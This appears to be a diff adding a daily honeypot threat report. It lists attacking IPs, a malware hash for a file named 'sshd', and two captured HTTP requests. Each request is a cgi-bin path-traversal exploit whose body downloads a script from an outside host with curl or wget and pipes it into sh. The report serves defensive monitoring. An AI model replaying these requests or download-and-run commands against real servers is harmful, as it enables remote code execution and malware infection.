@@ -1,0 +1,37 @@
+Top 5 IPs for 08-09-2024 :
+
+36.64.217.27
+172.174.72.225
+103.97.247.139
+43.134.168.196
+150.109.11.104
+
+
+Malware Observed:
+
+File Name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+Commands/exploits observed :
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: <Host IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 105
+
+X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo "$X" | sh -s apache.selfrepPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Host: <Host IP>
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 105
+
+X=$(curl http://94.156.177.109/sh || wget http://94.156.177.109/sh -O-); echo "$X" | sh -s apache.selfrep
